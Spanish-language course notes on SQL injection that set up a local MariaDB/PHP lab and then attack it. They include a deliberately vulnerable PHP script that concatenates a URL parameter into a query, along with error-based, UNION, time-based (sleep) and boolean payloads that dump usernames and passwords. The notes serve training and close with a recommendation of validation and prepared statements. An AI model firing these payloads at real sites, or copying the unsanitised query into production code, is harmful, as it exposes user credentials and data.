## Mis Apuntes: 

En esta clase iremos haciendo distintios ejemplos de sqli, por lo que tenemos que ir haciendo distintos tipos de labs en local para ir aprendiendo todo lo que sea necesario. 
Primero que todo instalaremos 3 servicios de la siguiente forma: 
```
$ apt install mariadb-server apache2 php-mysql
```
Estos son servicios para poder correr mariadb, php-mysql y apache2 para montar los laboratorios, por lo tanto iremos haciendo lo siguiente para comenzar.
```
$ service mysql start 

$ lsof -i:3306

con el primer comando iniciamos el servicio mysql
con el segundo vemos si el puerto 3306 esta conteniendo el servicio mysql
```
![[Pasted image 20240217152336.png]]
Ahora nos conectamos a la mysql como root en el primer caso no es necesario poner una contraseña: 
![[Pasted image 20240217152628.png]]
Si hacemos un `show databases;` dentro de mysql podemos ver que obtendremos información de que bases de datos existen en este momento en mysql: 
![[Pasted image 20240217152801.png]]
En este caso tenemos information_schema, mysql, performance_schema, sys.
Algo a tener en cuenta en este caso es que las bases de datos tienen tablas, esas tablas tienen columnas, esas columnas tiene datos almacenados. 
Utilizando `use <nombre de una base de datos>;` podemos ingresar a una tabla de mysql, en este caso ocuparemos la siguiente, `use mysql;`: 
![[Pasted image 20240217153116.png]]
Una vez dentro de la base de datos podemos hacer un `show tables;` para poder ver las tablas que tiene la base de datos en uso: 
![[Pasted image 20240217153236.png]]
Podemos ver que tenemos unas cuantas tablas. 
Podemos ver las columnas de una tabla utilizando el comando `describe <columna>;`, si vemos de todas las tablas que existen la que nos llama la atención es la que dice user, por lo tanto ocuparemos `describe user;`.
![[Pasted image 20240217153520.png]]
Podemos ver todos los atributos que tiene la tabla user.
Entonces con esto podemos ver la estructura de una base de datos, que esta compuesta por tablas, que las tablas contienen columnas y que las columnas tienen datos internos guardados.
Las sql injections sirven para poder sacar información relevante de una base de datos, tanto de usuarios como de otro tipo de información, como también nos pueden servir para autenticarnos en una pagina web sin necesidad de conocer la contraseña. 
Esto se hace a través de querys que se emplean para poder saltar algun tipo de autentificación o validación de información.
Siguiendo con el ejemplo podemos hacer una consulta dentro de la tabla para conocer el contenido de la columna use y password, esta se hace de la siguiente manera: 
```
$ select user,password from user; 
```
![[Pasted image 20240217154200.png]]
Hay formas de hacer una consulta más acotada, esta se hace empleando algunos marcadores con la palabra where. 
```
$ select user,password from user where user = 'root'; 
```
![[Pasted image 20240217160022.png]]
Ahora que ya aprendimos lo básico de mysql, haremos un ejercicio, el cual consiste en primero crear una base de datos, con tablas, columnas y datos propiamente tal, para poder después hacer un script en php para poder montar esa base de datos en una pagina web:
Partimos creando una base de datos, esta se hace empleando la siguiente linea de codigo: 
```
$ create database <nombre de la base de datos a crear>; 

en este ejemplo será: 
$ create databaase Hack4u; 
```
![[Pasted image 20240217160439.png]]
Ahora que estamos usando la base de datos Hack4u, podemos comenzar a crear tablas dentro de la base de datos:
```
$ create table users(id int(32), username varchar(32), password varchar(32));

estamos creando una tabla users con los campos id, que es un integer "números enteros" de 32 bits de largo, username varchar "caracteres variables (numeros, letras, caracteres especiales)" de 32 bits de largo, y lo mismo para password
```
![[Pasted image 20240217162529.png]]
Podemos ver ahora las tablas y columnas que contiene esta tabla de la siguiente forma: 
![[Pasted image 20240217163435.png]]
Se puede introducir datos dentro de la tabla de la siguiente manera: 
```
$ insert into users(id, username, password) values(1,'admin','admin123$!p@$$');
```
![[Pasted image 20240217164233.png]]
Para poder montar una pagina que pueda ocupar esta base de datos podemos tenemos que crear un usuario que pueda comunicarse con esta, esto se hace siguiendo lo siguientes pasos: 
```
$ create user 'gonzax'@'localhost' identified by 'gonzax123';
$ grant all privileges on Hack4u.* to 'gonzax'@'localhost';
```
![[Pasted image 20240217165122.png]]

### **Inyección SQL basada en errores**:

Procederemos a hacer el script en php para hacer el ejemplo correspondiente: 
Para establecer el la conexión en php se hace de la siguiente forma: 
```
<?php

		$server = "localhost";
        $username = "gonzax";
        $password = "gonzax123";
        $database = "Hack4u";

        // Conexión a la base de datos.
        $conn = new mysqli($server, $username, $password, $database);

?>
```
Ahora lo que queremos hacer es poder preguntar en el searchUsers.php es poder consultar por los usuarios según el id, por lo que podemos añadirle algunos identificadores, ya que la idea es pasarle un parámetro id a través de la url: 
![[Pasted image 20240217182840.png]]
`http://localhost/searchUsers.php?id=1`
Pero quiero que esto retorne datos dentro de la base de datos por lo que debemos hacer una consulta a la base de datos: 
```
<?php

        $server = "localhost";
        $username = "gonzax";
        $password = "gonzax123";
        $database = "Hack4u";

        // Conexión a la base de datos.
        $conn = new mysqli($server , $username , $password , $database);

        $id = $_GET['id'];

        $data = mysqli_query($conn, "select username from users where id = '$id'");

        $response = mysqli_fetch_array($data);

        echo $response['username'];
?>

```

si hacemos eso en el script de php podemos ver que la pagina responde con los nombres de usuario que existen segun su id: 
![[Pasted image 20240217184501.png]]
Esto puede ser una vulnerabilidad muy importante ya que al no esta sanitizada nuestra consulta puede pasar que nos hagan una sqli basada en errores, por lo general se hace lo siguiente: 
```
<?php

        $server = "localhost";
        $username = "gonzax";
        $password = "gonzax123";
        $database = "Hack4u";

        // Conexión a la base de datos.
        $conn = new mysqli($server , $username , $password , $database);

        $id = $_GET['id'];

        $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));

        $response = mysqli_fetch_array($data);

        echo $response['username'];
?>


```
en este caso veremos que si damos un error la conexión muere y nos manda un error de conexión, dándonos a entender que los parámetros pueden ser vulnerables, una inyección sql muy conocida es la de poner una comilla de más para poder "bloquear" la finalización de la consulta ya que esta comenta lo que sigue en la linea.
```
$ http://localhost/searchUsers.php?id=1'
```
![[Pasted image 20240217195056.png]]
luego de esto podemos comenzar con las distintas inyecciones, ya que ahora se le concatenará una serie de ordenes para poder obtener más información de la normal:
```
$ http://localhost/searchUsers.php?id=2' order by 100-- -

se comenta el final de la query para que no haya problemas con la corrupción de la consulta.
```
Para conseguir ver las columnas de una tabla hay que hacer fuzzing a esta, bajando la cantidad de columnas, en este caso como la query pregunta solo por el username, es decir que solo tenemos un order by 1
![[Pasted image 20240217225702.png]]
Una vez que sabemos la cantidad de columnas podemos trabajar con unión select, ya que ahora podemos hacer lo siguiente: 
![[Pasted image 20240217230821.png]]
podemos ver que se agrega una fila nueva dentro de la query, por lo que podemos poner lo que quieramos dentro de esta query.
![[Pasted image 20240217231003.png]]
para ver nuestra inyección tenemos que poner el id de un usuario que no existe, ya que si lo hacemos con un usuario existente aparecerá el nombre del usuario existente.
como vemos test ahora podemos decir que no muestre el nombre de la base de dato que se esta utilizando: 
```
http://localhost/searchUsers.php?id=4' union select database()-- -
```
![[Pasted image 20240217231228.png]]
Aquí otra forma de representar lo mismo:
![[Pasted image 20240217232603.png]]
en este caso esta haciendo un union select de la base de datos y el usuario que esta corriendo la base de datos. 
ahora podemos enumerar todas las bases de datos existentes en esta maquina, haciendo la siguiente query: 
```
http://localhost/searchUsers.php?id=4' union select schema_name from information_schema.schemata-- -
```
![[Pasted image 20240217233041.png]]
Pero tenemos un problema, ya que solo nos muestra 1 base de datos hay algunas formas de poder mostrar las siguientes, primero lo haremos con limits.
```
http://localhost/searchUsers.php?id=4' union select schema_name from information_schema.schemata limit 0,1-- -
```
En este caso el 0 es el espacio que quiere mostrar en este caso seria information_schema, y el 1 es la cantidad de datos que se quieren mostrar en pantalla. 
![[Pasted image 20240217233550.png]]
![[Pasted image 20240217233602.png]]
Esta es la primera forma, pero en realidad la mejor forma es jugar con un group_concat() de la siguiente forma: 
```
http://localhost/searchUsers.php?id=4' union select group_concat(schema_name) from information_schema.schemata-- -
```
![[Pasted image 20240217233719.png]]
Como ya sabemos el nombre de las bases de datos que existen, podemos ahora enumerar las tablas que tenga la base de datos que nos interesa: 
```
http://localhost/searchUsers.php?id=4' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
```
![[Pasted image 20240217234141.png]]
En este caso tenemos solo la tabla users dentro de la base de datos Hack4u. 
Ahora que sabemos la tabla que existe podemos ver ahora las columnas que tiene esta tabla, esto se hace con la siguiente query: 
```
http://localhost/searchUsers.php?id=4' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
```
Nos muestran ahora las columnas que existen dentro de la tabla que preguntamos: 
![[Pasted image 20240217234613.png]]
Ahora podemos por los datos que contiene esta tabla con la siguiente query: 
```
http://localhost/searchUsers.php?id=4' union select group_concat(username,0x3a,password) from users-- -
el 0x3a es el : en hexadecimal
```
![[Pasted image 20240217235040.png]]
Ahora una de las formas para saber si la pagina es vulnerable a una inyección sql, esta es hacer una query con tiempo de espera, de la siguiente forma: 
```
http://localhost/searchUsers.php?id=1' and sleep(5)-- -
```
Con un usuario valido, se le pone un and sleep(5)-- -, para que nos tome como valida la query y si nos espera la cantidad de segundos que le indicamos en el sleep, esto quiere decir que si es vulnerable a inyecciones sql: 
![[Pasted image 20240218003628.png]]
A modo de traza podemos poner un echo que nos muestre el id que colocamos dentro de la url:
![[Pasted image 20240218011641.png]]
![[Pasted image 20240218012351.png]]
ese es el script en php que nos muestra el valor del id
ahora tambien se pueden hacer otras sanitizaciones: 
![[Pasted image 20240218012613.png]]
cambia el id con la función mysqli_real_escape_string(), lo que hace esto es: 
![[Pasted image 20240218012657.png]]
nos escapa la comilla.
Algo que tenemos que tener en cuenta es que no siempre es necesario que después del número, va a depender de como este formulada la query por detrás, pero como no podemos verla, hay que intentar haciendo las querys de distintas formas. 
Bueno también dentro de las sql injections existen las inyecciones a ciegas, son aquellas en las que no se muestran ningun tipo de respuesta, por ejemplo: 
![[Pasted image 20240218130103.png]]
en este caso si no encuentra un nombre de usuario la pagina mandará un error 404.
![[Pasted image 20240218130120.png]]
en este caso tendremos que ir haciendo todo a través de `curl -s -X GET "http://localhost/searchUsers.php?id=2" -I` el -I es para ver 
### **Inyección SQL basada en booleanos**:
cuando estamos a ciegas por lo general lo que se hace es poder hacer comparaciones dentro de la base de datos, estas se hacen con substrings para poder ir comparando letra por letra hasta poder conseguir encontrar una comparacion que nos entregue como respuesta un true, teniendo la misma base de datos que antes podemos ir haciendo la comparacion de la siguiente forma: 
```
create table users (id integer(32), firstname varchar(32), password varchar(32));
insert into users (id, firstname, password) values (1, 'admin', 'admin123!$p@$$');
insert into users (id, firstname, password) values (2, 'gonza', 'gonzalammer123');
insert into users (id, firstname, password) values (3, 'tomas', 'tomaselhacker');
```
se hace una consulta para ir haciendo comparaciones letra por letra de la siguiente manera: 
```
select(select substring(username,1,1) from users where id = 1)='a';

en la parte del substring(dato,posicion del dato a consultar, cantidad de datos)
```
esto nos debería devolver una respuesta numérica, 1 para decir true y 0 en el caso de que sea false. 
En algunos casos estas querys están capadas es decir que no les gusta la comparación entre strings y pasa de ser 'a'='a', entonces podríamos cambiar esto a números decimales como el siguiente ejemplo: 
```
select(select ascii(substring(username,1,1)) from users where id = 1)=97;

con la función ascii convertimos la respuesta de la función substring a número.
```
ahora volviendo a los curl, podemos modificar un poco lo que teníamos antes para no tener que url encodear lo que viene después de searchUsers.php esto se hace se la siguiente forma: 
```
$ curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=2"
```
![[Pasted image 20240219132126.png]]
por lo que si decimos lo siguiente: 
![[Pasted image 20240219132252.png]]
podemos ver que si se hace una sentencia or junto con algo que sea verdadero como que 1=1 es verdadero pasa que nos da una respuesta 200 ok
![[Pasted image 20240219132702.png]]
podemos ver la comparación que se hace en la clase de savitar que al hacer la comparación en ascii es verdadera la sentencia cuando preguntan si '97'='97' es decir que 'a'='a'.
ahora haremos un script en python para poder hacer una sqli de acuerdo a las condicionales anteriormente vista: 
![[Pasted image 20240219163137.png]]
podemos ver dentro de esta función que tenemos algunas cosas importantes que destacar como por ejemplo el trabajo con los ascii para no tener que comparar con caracteres printables, es decir que dentro de la query  tenemos 2 dígitos que van a estar moviéndose, 1 que es la posición dentro de la palabra que es la que esta después de username y el otro es el digito de comparación, que es el valor ascii de la letra, estos los valores los podemos ver con el comando `man ascii`.
Dando esto como resultado lo siguiente: 
![[Pasted image 20240219163501.png]]


---
## Clases de SQLI: 

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de inyecciones SQL, incluyendo:

- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
- **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
- **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
- **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
- **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.

Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:

- **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
- **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
- **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
- **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.

Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.

A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:

- **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)